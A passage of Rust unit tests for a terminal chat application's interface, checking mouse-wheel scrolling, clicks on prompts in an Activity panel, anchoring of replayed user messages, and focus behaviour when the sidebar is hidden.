    assert_eq!(before, (a.ws_sel, a.run_sel, a.act_scroll, a.scroll));
    // the chat still scrolls with the wheel
    let c = r.chat_rect.unwrap();
    wheel(&mut a, c.x + 5, c.y + 2, WheelDir::Up);
    assert!(a.scroll > 0);
}

#[test]
fn clicking_a_prompt_in_activity_scrolls_the_chat_to_it() {
    let mut a = multi_app();
    prompts(&mut a, 80);
    big(&mut a);
    let r = a.frame.as_ref().unwrap().rects.clone();
    let act = r.activity_rect.unwrap();
    // scroll Activity to the oldest prompts, then click the first visible row
    for _ in 0..500 {
        wheel(&mut a, act.x + 2, act.y + 2, WheelDir::Up);
    }
    big(&mut a);
    let r = a.frame.as_ref().unwrap().rects.clone();
    let (i, at) = r.activity_hits[0];
    assert_eq!(a.activity.activity[at].text, "prompt number 0");
    tap(&mut a, act.x + 4, act.y + 1 + i as i64);
    assert!(a.scroll > 0, "the chat moved up to the old prompt");
    // the prompt is the first row of the chat view
    let lines = a.render(160, 48, T0);
    let c = a.frame.as_ref().unwrap().rects.chat_rect.unwrap();
    let first = strip_ansi(&lines[c.y as usize + 1]);
    assert!(first.contains("> prompt number 0"), "{first:?}");
    // a click on a row that is not a prompt (the sidebar header) is not an error
    tap(&mut a, 2, 0);
}

#[test]
fn a_replayed_prompt_in_activity_knows_its_chat_item() {
    let ev = |i: u64, t: &str| {
        env(
            i,
            Ev::UserMessage {
                text: t.into(),
                display_text: None,
                images: vec![],
            },
        )
    };
    let a = App::new(cfg("/tmp/proj"), &[ev(1, "first"), ev(2, "second")], T0);
    let anchors: Vec<Option<usize>> = a.activity.activity.iter().map(|f| f.anchor).collect();
    let users: Vec<usize> = (0..a.chat.agent.items.len())
        .filter(|i| a.chat.agent.items[*i].kind == "user")
        .collect();
    assert_eq!(anchors, users.iter().map(|i| Some(*i)).collect::<Vec<_>>());
    assert_eq!(users.len(), 2);
}

#[test]
fn without_a_sidebar_tab_skips_the_panels_and_the_mouse_paths_are_inert() {
    let mut a = multi_app();
    a.render(70, 24, T0);
    assert!(!a.sidebar_visible());
    keys(&mut a, "\t");
    assert_eq!(a.side, Focus::Agent);
    tap(&mut a, 3, 5);
    wheel(&mut a, 3, 5, WheelDir::Down);
    assert_eq!((a.ws_sel, a.run_sel, a.act_scroll), (0, 0, 0));
    assert!(a.quit.is_none());
    // a screen that shrinks while a panel has the focus gives the keyboard back
    a.render(120, 40, T0);
    keys(&mut a, "\t");
    assert_eq!(a.side, Focus::Workspace);
    a.render(70, 24, T0);
    assert_eq!(a.side, Focus::Agent);
}
